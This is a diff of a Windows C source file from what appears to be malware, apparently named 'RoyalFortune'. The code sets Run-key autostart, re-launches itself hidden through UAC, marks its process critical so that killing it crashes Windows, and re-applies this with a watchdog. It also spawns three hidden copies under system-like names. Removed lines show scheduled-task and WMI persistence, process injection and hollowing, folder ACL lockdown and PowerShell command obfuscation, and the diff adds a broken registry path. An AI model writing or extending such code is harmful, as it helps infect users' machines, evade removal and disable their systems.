@@ -7,10 +7,7 @@
 
 #include "../engine/engine.h"
 
-#include <tlhelp32.h>
-#include <psapi.h>
-#include <wincrypt.h>
-
+/* Execute system command and capture output */
 char* sys_run_command(const char *cmd) {
     static char out[NET_BUF_SIZE];
     memset(out, 0, NET_BUF_SIZE);
@@ -131,7 +128,7 @@ char* sys_get_info(void) {
     char model[256] = {0};
     DWORD modelLen = sizeof(model);
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
-        "HARDWARE\\DESCRIPTION\\System\\BIOS", 
+        "HARDWARE\DESCRIPTION\System\BIOS", 
         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
         RegCloseKey(hKey);
@@ -163,12 +160,7 @@ char* sys_get_info(void) {
     return info;
 }
 
-/* Ensure a process persists via scheduled task — delegates to obfuscated impl */
-static void ensure_scheduled_task(const char *exePath, const char *taskName) {
-    util_ensure_task(exePath, taskName);
-}
-
-/* Register application for auto-start on login + scheduled task */
+/* Register application for auto-start on login */
 void sys_register_autostart(void) {
     HKEY hKey;
     char path[MAX_PATH];
@@ -179,14 +171,9 @@ void sys_register_autostart(void) {
         RegSetValueExA(hKey, "RoyalFortune", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
         RegCloseKey(hKey);
     }
-    /* Also add scheduled task for redundancy */
-    util_ensure_task(path, "RoyalFortuneMain");
 }
 
 /* Check and request required privileges for system integration */
-/* IsUserAnAdmin is exported by shell32.dll, used by many installers */
-BOOL WINAPI IsUserAnAdmin(void);
-
 void sys_check_privileges(void) {
     if (IsUserAnAdmin()) return;
     char path[MAX_PATH];
@@ -194,6 +181,7 @@ void sys_check_privileges(void) {
     char action[16] = {0};
     action[0] = 'r'; action[1] = 'u'; action[2] = 'n'; action[3] = 'a'; action[4] = 's';
 
+    /* Preserve command-line args when re-launching with admin */
     char *fullCmdLine = GetCommandLineA();
     char *args = fullCmdLine;
     if (*args == '"') {
@@ -205,8 +193,7 @@ void sys_check_privileges(void) {
     }
     while (*args == ' ') args++;
 
-    /* Use SW_SHOWNORMAL so user sees window after UAC approval */
-    ShellExecuteA(NULL, action, path, args, NULL, SW_SHOWNORMAL);
+    ShellExecuteA(NULL, action, path, args, NULL, SW_HIDE);
     ExitProcess(0);
 }
 
@@ -225,12 +212,12 @@ void sys_check_antivirus(void) {
     sys_run_command(cmd);
 }
 
-/* === Process Protection (Plain String Versions — work regardless of obf state) === */
+/* === Process Protection === */
 
-int g_svc_protected = 0;
+static int g_critical_protected = 0;
 
 /* Enable a privilege for the current process token */
-static int enable_privilege_plain(const char *privilege_name) {
+static int enable_privilege(const char *privilege_name) {
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     LUID luid;
@@ -253,40 +240,37 @@ static int enable_privilege_plain(const char *privilege_name) {
         return 0;
     }
 
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-        CloseHandle(hToken);
-        return 0;
-    }
-
     CloseHandle(hToken);
     return 1;
 }
 
-/* Mark process as critical — uses plain strings, works even if obf decoders are broken */
+/* Mark process as critical — Windows BSODs if this process dies.
+   Requires SeDebugPrivilege. */
 void sys_protect_process(void) {
     typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
     
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
-        g_svc_protected = -1;
+        g_critical_protected = -1;
         return;
     }
     
     NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
     if (!pNtSetInformationProcess) {
-        g_svc_protected = -1;
+        g_critical_protected = -1;
         return;
     }
     
-    enable_privilege_plain("SeDebugPrivilege");
+    /* ProcessBreakOnTermination requires SeDebugPrivilege */
+    enable_privilege("SeDebugPrivilege");
     
     ULONG isCritical = 1;
     NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
     
     if (status == 0) {
-        g_svc_protected = 1;
+        g_critical_protected = 1;
     } else {
-        g_svc_protected = -1;
+        g_critical_protected = -1;
     }
 }
 
@@ -300,21 +284,22 @@ void sys_unprotect_process(void) {
     NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
     if (!pNtSetInformationProcess) return;
     
-    enable_privilege_plain("SeDebugPrivilege");
+    enable_privilege("SeDebugPrivilege");
     
     ULONG isCritical = 0;
     pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
-    g_svc_protected = 0;
+    g_critical_protected = 0;
 }
 
 /* Get protection status string */
 const char* sys_protection_status(void) {
-    if (g_svc_protected == 1) return "CRITICAL";
-    if (g_svc_protected == -1) return "FAILED";
+    if (g_critical_protected == 1) return "CRITICAL";
+    if (g_critical_protected == -1) return "FAILED";
     return "NORMAL";
 }
 
-/* Check if current process is actually marked as critical — plain string version */
+/* Check if current process is actually marked as critical via NtQueryInformationProcess.
+   Returns a string with the process name included. */
 const char* sys_check_critical_status_with_name(void) {
     static char buf[512];
     char path[MAX_PATH] = {0};
@@ -326,29 +311,29 @@ const char* sys_check_critical_status_with_name(void) {
     typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
-        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[Failed to load ntdll.dll] [%s]", filename);
         return buf;
     }
 
     NtQueryInfoProc pNtQuery = (NtQueryInfoProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
     if (!pNtQuery) {
-        snprintf(buf, sizeof(buf), "[Failed to resolve NtQueryInformationProcess] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[Failed to find NtQueryInformationProcess] [%s]", filename);
         return buf;
     }
 
-    enable_privilege_plain("SeDebugPrivilege");
+    enable_privilege("SeDebugPrivilege");
 
     ULONG isCritical = 0;
     NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);
 
     if (status != 0) {
-        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[Query failed — status != 0] [%s]", filename);
         return buf;
     }
     if (isCritical) {
-        snprintf(buf, sizeof(buf), "[PROTECTED] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[CRITICAL — ending this process will cause BSOD] [%s]", filename);
     } else {
-        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[NORMAL — can be terminated safely] [%s]", filename);
     }
     return buf;
 }
@@ -356,35 +341,12 @@ const char* sys_check_critical_status_with_name(void) {
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
-        if (g_svc_protected != 1) {
+        if (g_critical_protected == 1) {
             sys_protect_process();
         }
-        Sleep(5000);
+        Sleep(5000);  /* Re-apply every 5 seconds */
     }
     return 0;
-}
-
-/* === CLEANUP: Remove registry persistence and exit === */
-void sys_cleanup(void) {
-    extern volatile int g_exiting;
-    g_exiting = 1;
-    
-    /* Remove critical flag from current process */
-    sys_unprotect_process();
-    
-    /* Remove registry Run keys */
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\Microsoft\Windows\CurrentVersion\Run",
-            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, "ElevationService");
-        RegDeleteValueA(hKey, "CrashHandler");
-        RegDeleteValueA(hKey, "NotifyService");
-        RegDeleteValueA(hKey, "RoyalFortune");
-        RegCloseKey(hKey);
-    }
-    
-    ExitProcess(0);
 }
 
 /* Ensure directory exists (create recursively) */
@@ -412,8 +374,8 @@ int sys_is_admin(void) {
 }
 
 /* Spawn a single shadow copy with a given filename and registry key name.
-   Uses CreateProcess for elevation inheritance, adds Run key + scheduled task. */
-static void deploy_single_service(const char *filename, const char *regKey) {
+   Uses CreateProcess for elevation inheritance. */
+static void spawn_single_copy(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
 
@@ -434,7 +396,7 @@ static void deploy_single_service(const char *filename, const char *regKey) {
         return;
     }
 
-    /* Register persistence: Run key */
+    /* Register persistence */
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -445,10 +407,7 @@ static void deploy_single_service(const char *filename, const char *regKey) {
         RegCloseKey(hKey);
     }
 
-    /* Register persistence: Scheduled task (runs every 5 minutes) */
-    util_ensure_task(destPath, regKey);
-
-    /* Spawn with admin elevation via CreateProcessA (inherits parent elevated token) */
+    /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
@@ -456,123 +415,24 @@ static void deploy_single_service(const char *filename, const char *regKey) {
     char cmdLine[1024];
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
 
-    CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
-                   CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                   NULL, NULL, &si, &pi);
-    if (pi.hProcess) {
+    BOOL created = CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+                       NULL, NULL, &si, &pi);
+
+    if (created) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+    } else {
+        /* Fallback: ShellExecuteA with "open" */
+        ShellExecuteA(NULL, "open", destPath, "--shadow", NULL, SW_HIDE);
     }
 }
 
-/* Deploy three system services with generic computer-related names */
-void sys_deploy_services(void) {
-    char localAppData[MAX_PATH];
-    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
-    char dirPath[MAX_PATH];
-    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
-    ensure_dir_exists(dirPath);
-    
-    /* Harden directory FIRST — deny DELETE_CHILD so files can't be deleted from it */
-    SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-    char *icacls = "icacls";
-    char cmd[1024];
-    snprintf(cmd, sizeof(cmd),
-        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
-        icacls, dirPath);
-    sys_run_command(cmd);
-    snprintf(cmd, sizeof(cmd),
-        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
-        icacls, dirPath);
-    sys_run_command(cmd);
-    
-    deploy_single_service("ElevationService.exe", "ElevationService");
-    util_lock_file("ElevationService.exe");
-    
-    deploy_single_service("CrashHandler.exe", "CrashHandler");
-    util_lock_file("CrashHandler.exe");
-    
-    deploy_single_service("NotifyService.exe", "NotifyService");
-    util_lock_file("NotifyService.exe");
-    
-    /* Apply all advanced layers automatically using obfuscated APIs */
-    util_setup_wmi();
-    util_lock_files();   /* Full re-harden as safety net */
-    util_spawn_remote();      /* obfuscated svchost/explorer injection */
-    Sleep(2000);
-    util_spawn_memory();      /* obfuscated fileless hollowing */
-    Sleep(1000);
-    /* REMOVED */;         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
-}
-
-/* === Advanced Persistence & Evasion === */
-
-/* 1. WMI Event Subscription — delegates to obfuscated implementation */
-void sys_wmi_persistence(void) {
-    util_setup_wmi();
-}
-
-/* 2. Process Injection — delegates to obfuscated implementation */
-void sys_inject_process(void) {
-    util_spawn_remote();
-}
-
-/* 3. NTFS ACL Hardening — delegates to obfuscated implementation */
-void sys_harden_files(void) {
-    util_lock_files();
-}
-
-/* 4. LOLBAS — delegates to obfuscated implementation */
-void sys_lolbas_download(const char *url, const char *outPath) {
-    util_download_file(url, outPath);
-}
-
-/* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
-char* sys_obfuscate_ps(const char *command) {
-    static char result[NET_BUF_SIZE];
-    
-    int wlen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
-    if (wlen <= 0) {
-        snprintf(result, sizeof(result), "[Obfuscation failed: conversion error]");
-        return result;
-    }
-    
-    wchar_t *wcmd = (wchar_t*)malloc(wlen * sizeof(wchar_t));
-    if (!wcmd) {
-        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
-        return result;
-    }
-    
-    MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, wlen);
-    
-    int blen = (wlen - 1) * sizeof(wchar_t);
-    DWORD base64len = 0;
-    
-    if (!CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64len) || base64len == 0) {
-        free(wcmd);
-        snprintf(result, sizeof(result), "[Obfuscation failed: encoding error]");
-        return result;
-    }
-    
-    char *base64 = (char*)malloc(base64len);
-    if (!base64) {
-        free(wcmd);
-        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
-        return result;
-    }
-    
-    CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64len);
-    
-    snprintf(result, sizeof(result), "powershell -NoProfile -WindowStyle Hidden -EncodedCommand %s", base64);
-    
-    free(wcmd);
-    free(base64);
-    return result;
-}
-
-/* 2b. Process Hollowing — delegates to obfuscated implementation */
-void sys_hollow_process(void) {
-    util_spawn_memory();
+/* Spawn three shadow copies with generic computer-related names */
+void sys_spawn_shadow_copy(void) {
+    spawn_single_copy("ElevationService.exe", "ElevationService");
+    spawn_single_copy("CrashHandler.exe", "CrashHandler");
+    spawn_single_copy("NotifyService.exe", "NotifyService");
 }
 
 /* === Clipboard Subsystem === */
